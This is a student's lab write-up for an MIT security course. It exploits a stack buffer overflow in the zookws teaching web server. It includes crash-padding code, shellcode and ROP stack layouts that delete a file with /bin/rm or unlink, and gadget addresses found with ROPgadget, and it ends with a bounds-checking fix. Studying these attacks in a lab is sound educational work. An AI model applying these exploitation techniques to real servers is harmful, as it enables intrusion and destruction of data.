# Lab 1: Buffer Overflows
- We will exploit the buffer overflow vulnerabilities in the context of a web server called `zookws`, which runs a simple python web application `zoobar`
- *Lab infrastructure*:
    - for convenience, use the provided Ubuntu 21.10 Linux virtual machine
    - username: `student`, password: `6858`
    - `ssh -p 2222 student@<IP_ADDRESS>`
    - I used VSCode to ssh login to the VM, we need the following configuration in `~/.ssh/config`
        ```
        Host 858vm
            User student
            HostName <IP_ADDRESS>
            Port 2222
            IdentityFile ~/.ssh/858ssh
        ```
- *Preparation*:
    - Get and compile the lab code
        ```
        $ git clone https://web.mit.edu/6858/2022/lab.git
        $ make
        ```
    - There are 2 versions of `zookd`
        - `zookd-exstack`: runs with an executable stack
        - `zookd-nxstack`: runs with a non-executable stack
    - To run the web server in a predictable fashion, i.e., each time the stack and memory layout is the same, use `clean-env.sh`
    - Run `$ ./clean-env.sh ./zookd 8080`, the `clean-env.sh` commands starts `zookd` on port 8080, then we can visit `http://<VM_IP>:8080/` in our browser

## Part 1: Finding buffer overflows
- Study the server's C code (`zookd.c` and `http.c`) to find one example of code that allows the attacker to overwrite the return address of a function
- `zookd.c`
    1. `main()`, `run_server`, and `start_server` basically create a socket listening to all network interfaces (`0.0.0.0`) and the port specified in the first argument. When a new connection request comes, `run_server` will create a child process, which will run `process_client(cltfd)`, where `cltfd` is the file descriptor of the client socket
    2. `process_client()`
        1. Declares a static buffer `env[8192]` (not on the stack)
        2. Declares a buffer `reqpath[4096]` on the stack
        3. Invokes `http_request_line(fd, reqpath, env, &env_len)`, it reads the first line of the request, like `GET /tmp HTTP/1.0`, and parses it
        4. Invokes `env_deserialize(env, sizeof(env))`
        5. Invokes `http_request_headers(fd)`, it reads the rest of the request and parse the HTTP headers
- `http.c`
    1. `http_read_line(int fd, char *buf, size_t size)`
        - Reads the HTTTP request from the client FD byte by byte, until it sees the first `\n` or `\r`, i.e., it reads one line of the request
    2. `http_request_line(int fd, char *reqpath, char *env, size_t *env_len)`
        - Invokes `http_read_line()`, but converts the returned integer to error information if there is an error
        - Parses request like `GET /foo.html?a=1 HTTP/1.0` (only support `GET` and `POST`)
        - Finally stores the URL decoded request path (e.g., `/foo.html`) in `reqpath`, store some environment variables (e.g., `REQUEST_METHOD=GET\0SERVER_PROTOCOL=HTTP/1.0\0QUERY_STRING=a=1\0REQUEST_URI=/foo.html\0SERVER_NAME=zoobar.org`) in `env`
    2. `const char *http_request_headers(int fd)`
        - Parses the rest of the request, each line is like `XXX: ...`, e.g., `Cookie: foo bar`
        - Converts the header name (e.g., `Cookie`, `Content-Type`) to uppercase, replaces all hyphens with underscores, and add these header names to `envvar`, notice that all header names will be added a prefix `HTTP_` except `CONTENT_TYPE` and `CONTENT_LENGTH`
        - Uses `setenv` to set the header names and corresponding values (URL decoded) as environment variables
    3. `env_deserialize(const char *env, size_t len)`
        - Parses the content in `env`, which is like `REQUEST_METHOD=GET\0SERVER_PROTOCOL=HTTP/1.0\0QUERY_STRING=a=1\0REQUEST_URI=/foo.html\0SERVER_NAME=zoobar.org`, set them as environment variables
        - For example, by processing `REQUEST_METHOD=GET\0`, it invokes `setenv('REQUEST_METHOD', 'GET')`
    4. `url_decode(char *dst, char *src)`
        - URL decodes the content in `src` and store the result in `dst`

- *vulnerability*: a buffer overflow can happen when the request path (after URL decoded ) is longer than the length of `regpath` (4096 bytes), this is possible because the maximum length of each line can get to 8192 bytes (the size of `env`), and there isn't any size check when invoking `url_decode(reqpath, sq1)` inside `http_request_line(fd, reqpath, env, &env_len)`
    - The chain of function calls: `process_client()`, `http_request_line()`, `url_decode()`

- Now we can start developing exploits. The provided `~/lab/exploit-template.py` issues an HTTP request, it takes 2 arguments, the server name and port number, we can run it in this way: 
    ```
    $ ./clean-env.sh ./zookd-exstack 8080 & <-- starts the server in the backgroud
    $ ./exploit-template.py localhost 8080
    ```
- `gdb` is useful in building our exploits, we can attach it to an already-running process with `gdb -p $(pgrep zookd-)`. By default, `gdb` continues to debug parent process and does not attach to the child when the process forks. We can using the command `set follow-fork-mode child` to attach `gdb` to the child process, we can add it to `~/lab/.gdbinit`

- *exploitation (simple version)*: crash the server or one of the processes it creates. We just need to pad enough bytes into the request path to overwrite the return address of function `process_client()`. Inside `process_client()`, there are 2 stack variables, a buffer of 4096 bytes and a pointer of 8 bytes. And the previous `rbp` (8 bytes) is in the stack frame of `process_client()`. And finally, the next 8 bytes is the return address. Since there is a `/` in the request path, we directly pad at least `4096+8+8+7` none-zero bytes (because inside `url_decode()`, the decoding and copying process stops when it sees `\0`). Core code:
    ```
    def build_exploit(payload):
        req =   b"GET /" + payload + b" HTTP/1.0\r\n" + \
                b"\r\n"
        return req
        
    def create_padding(pad_len, pad_byte = b'\x90'):
        padding = b''
        for i in range(pad_len):
            padding = padding + pad_byte
        return padding

    req = build_exploit(create_padding(4096 + 8 + 8 + 7))
    resp = send_req(sys.argv[1], int(sys.argv[2]), req) # send_req() is provided in the template
    ```
    ```
    (server side)
    zookd-exstack: [4710] Request failed: Request too long
    Child process 4710 terminated incorrectly, receiving signal 4
    ```

## Part 2: Code injection
- Exploit the vulnerability to inject shellcode to the server to remove a file `/home/student/grades.txt`
- First, we can develope a program that removes this file, to do this, we just need a system call `execve("/bin/rm", {"rm", "/home/student/grades.txt", NULL}, {NULL})`, we can store these parameters on the stack. When passing parameters to the system call, the first parameter (`rdi`) is `[rsp+56]`, the second (`rsi`) is `[rsp]`, the third (`rdx`) is `0x0` (`NULL`)
    ```
    +--------------------------+ High address
    |           ...            |
    |--------------------------|
    |       "/bin/rm\0"        |
    |--------------------------| <-- rsp+56
    |     0x0000000000000000   |
    |--------------------------| <-- rsp+48
    |        "ades.txt"        |
    |--------------------------| <-- rsp+40
    |        "udent/gr"        |
    |--------------------------| <-- rsp+32
    |        "/home/st"        |
    |--------------------------| <-- rsp+24
    |     0x0000000000000000   |
    |--------------------------| <-- rsp+16
    |          rsp+24          | (address of "/home/student/grades.txt")
    |--------------------------| <-- rsp+8
    |          rsp+61          | (address of "rm")
    |--------------------------| <-- rsp
    |           ...            |
    +--------------------------+ Low address
    ```

- Then, we need to know the address of the buffer `reqpath` (in `process_client()`), as well as the `rbp` of the stack frame of `process_client()`
    1. In `/home/student/lab`, run `gdb -p $(pgrep zook-)`
    2. Set a breakpoint at `process_client()`
    3. Send any request to the server to trigger the breakpoint
    4. Inside `process_client()`, run a few instructions to ensure the `rbp` of the current frame is set
    5. Check the address of `reqpath`, and `rbp` (return address is stored at `rbp+8`)
        ```
        (gdb) p/x &reqpath
        $2 = 0x7fffffffdca0
        (gdb) p/x $rbp
        $3 = 0x7fffffffecb0
        ``` 
- Finally, we can construct our payload, to overwrite the return address of `process_client()` to redirect the execution to our shellcode
    - My payload is constructed as (`reqpath` is `/[PAYLOAD]`)
        - `low <-- [shellcode | 0x90 ... | return address (0x7fffffffdca1)] --> high`
- My solution cannot be directly used for submission, because some file names are different (e.g., my shellcode bytes are stored in `shellcode-raw`, not `shellcode.bin`)
- One thing important is that there cannot be any zero bytes (`0x00`) in our payload, otherwise, the content after that will be ignored, and the server cannot parse our request correctly

## Part 3: Return-to-libc attacks
- This is to defeat the non-executable stack countermeasure
- An obstacle to perform the return-to-libc attacks in this lab is that in x86-64 calling conventions, the first 6 arguments of a function are passed in registers (`rdi`, `rsi`, `rdx`, `rcx`, `r8`, and `r9`), so we cannot simply push the parameters on the stack
- A piece of code in the server that loads an address into `rdi` is referred to as a *borrowed code chunk*, or an *ROP gadget*
- In the server code, there is an `accidentally()` that helps us to load an argument to `rdi`, so we can overwrite the orginal return address of `process_client()` to the address of `accidentally()` in the memory, and the 8 bytes next (higher) to the return address is the address of a chosen libc function (we can use `system()`), and the next 8 bytes are the parameter to it. Here is the layout of the stack (after the buffer overflow)
    ```
    +--------------------------+ High address
    |           ...            |
    |--------------------------|
    |       command string     |
    |--------------------------| <-- rbp+32
    |   parameter of system()  |
    |--------------------------| <-- rbp+24
    |    address of system()   |
    |--------------------------| <-- rbp+16
    | address of accidentally()|
    |--------------------------| <-- rbp+8
    |           ...            |
    +--------------------------+ Low address
    ```
- This is the assembly code of `accidentally()` in memory
    ```
    0x555555556b8c <accidentally>:       endbr64 
    0x555555556b90 <accidentally+4>:     push   %rbp
    0x555555556b91 <accidentally+5>:     mov    %rsp,%rbp
    0x555555556b94 <accidentally+8>:     mov    0x10(%rbp),%rdi
    0x555555556b98 <accidentally+12>:    nop
    0x555555556b99 <accidentally+13>:    pop    %rbp
    0x555555556b9a <accidentally+14>:    ret 
    ```
- The address of libc function `system()`
    ```
    (gdb) p &system
    $4 = (int (*)(const char *)) 0x15555533cae0 <__libc_system>
    ```
- The parameter of `system()` is a string. We would like it to run `/bin/rm /home/student/grades.txt`, so we also need to put `b'/bin/rm /home/student/grades.txt\0'` somewhere in our payload. One thing we need to pay attention to is that in 64-bit systems, the highest 2 bytes of the addresses are always zero bytes, if we directly send b'\x00' in our request path, it will be interpreted as end character, and the content after that will be ignored. So, we have to URL encode our payload (in previous parts, I intentionally avoided using any zero byte in my payload, so I didn't URL encode my payload)

- *Challenge*: what if we don't have this `accidentally()` function? We need to find other ROP gadget that load content on the stack to `rdi`. We can use [`ROPgadget`](https://github.com/JonathanSalwan/ROPgadget), a tool that can assist us in searching for ROP gadgets and is pre-installed in the course VM
    - Get the address of the libraries that `zookd` loads at runtime
        ```
        $ ulimit -s unlimited && setarch -R ldd zookd-nxstack
        linux-vdso.so.1 (0x000015555551d000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00001555552da000)
        /lib64/ld-linux-x86-64.so.2 (0x000015555551f000)
        ```
    - First, try to look for `pop rdi` and then `ret`, i.e., look for 2 consecutive bytes `5F C3`, we can try in these libraries or in `zookd-nxstack` itself. I found some in `/lib64/ld-linux-x86-64.so.2`
        ```
        $ ROPgadget --binary /lib64/ld-linux-x86-64.so.2 --opcode "5fc3"
        Opcodes information
        ============================================================
        0x0000000000002538 : 5fc3
        ...
        ```
    - To verify the result, we can use `gdb` to debug `zookd-nxstack`, and check the instructions from `0x0000155555521538` (`0x000015555551f000 + 0x2538`)
        ```
        (gdb) x/16i 0x0000155555521538
        0x155555521538 <handle_preload_list+264>:    pop    %rdi
        0x155555521539 <handle_preload_list+265>:    ret 
        ```
    - Construct the payload: it is a little bit different from the payload of the previous task, because `accidentally()` pushes `rbp` to the stack, while in this task, there is no such action, we need to ensure that when we return to the ROP gadget, the `rsp` points right to the parameter of `unlink()`. The following is the stack layout when the buffer overflows
        ```
        +--------------------------+ High address
        |           ...            |
        |--------------------------|
        |         file path        |
        |--------------------------| <-- rbp+32
        |    address of unlink()   |
        |--------------------------| <-- rbp+24
        |   parameter of unlink()  |
        |--------------------------| <-- rbp+16
        |   address of ROP gadget  | (`0x0000155555521538`)
        |--------------------------| <-- rbp+8
        |           ...            |
        +--------------------------+ Low address
        ```
    - I used `unlink("/home/student/grades.txt")` because when I tried `system("/bin/rm /home/student/grades.txt")`, it didn't work, although at the moment we successfully reach to the `system()`, the value of `rdi` is correct, but the execution failed somewhere inside `system()`, I am still debugging the program to figure out the problem. As an alternative solution, I just modified the second address to the address of `unlink()`, and modify the string to the file's path, and then I succeeded to delete the file

    - Problem with `system()`: by debugging the program, I found that the program crashed when executing this instruction: `<do_system+355>: movaps %xmm0,0x50(%rsp)`. The `rsp` is `0x7fffffffe938`, the problem might be that `rsp` is not aligned to 16-byte boundary. When I manually `set $rsp=0x7fffffffe930`, the program will not crash, although the file can still not be removed. Maybe before entering `system()`, I can borrow the `ret` in `/lib64/ld-linux-x86-64.so.2` again to pop 8 bytes from the stack, and make `rsp`'s value multiple of 16. The address of `ret` is `0x0000155555521539`. By testing, this is a valid solution. Here is the stack layout (at the time the buffer overflows)
        ```
        +--------------------------+ High address
        |           ...            |
        |--------------------------|
        |         file path        |
        |--------------------------| <-- rbp+40
        |    address of system()   |
        |--------------------------| <-- rbp+32
        |   parameter of system()  |
        |--------------------------| <-- rbp+24
        |  address of ROP gadget2  | (0x0000155555521539)
        |--------------------------| <-- rbp+16
        |  address of ROP gadget1  | (0x0000155555521538)
        |--------------------------| <-- rbp+8
        |           ...            |
        +--------------------------+ Low address
        ```

## Part 4: Fixing buffer overflows and other bugs
- To fix the buffer overflow vulnerability at the first place, we only need to pass the max length of `reqpath` to the `url_decode()` function. Besides, `char value[512]` in `http_request_headers()` can also be overflowed, so when we call `url_decode()` here, we need to pass `512` as the max length of `value`
    - `const char *http_request_line(int fd, char *reqpath, size_t reqpath_len, char *env, size_t *env_len);`
    - `void url_decode(char *dst, const char *src, size_t max_len);`
- I tested the modified code, attacks in previous parts no longer worked
